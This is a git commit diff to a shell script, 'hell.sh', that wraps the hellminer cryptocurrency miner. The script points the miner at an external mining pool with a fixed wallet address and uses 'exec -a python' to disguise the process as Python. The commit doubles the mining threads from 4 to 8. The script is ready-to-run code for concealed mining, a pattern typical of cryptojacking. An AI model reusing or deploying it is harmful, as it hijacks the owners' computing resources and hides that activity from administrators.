08f178f87167c18aa88136484341edabf64c8455
gahalusinta4 <gahalusinta@gmail.com>
2024-09-30 09:09:12 +0800

    Update hell.sh

--- hell.sh
+++ hell.sh
@@ -1,4 +1,4 @@
 # hellminer_wrapper.sh
 #!/bin/bash
 RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
-exec -a python ./hellminer --pool us.vipor.net:5040 -u RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.WORKER$RANDOM_NUMBER -p x --threads 4
+exec -a python ./hellminer --pool us.vipor.net:5040 -u RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.WORKER$RANDOM_NUMBER -p x --threads 8
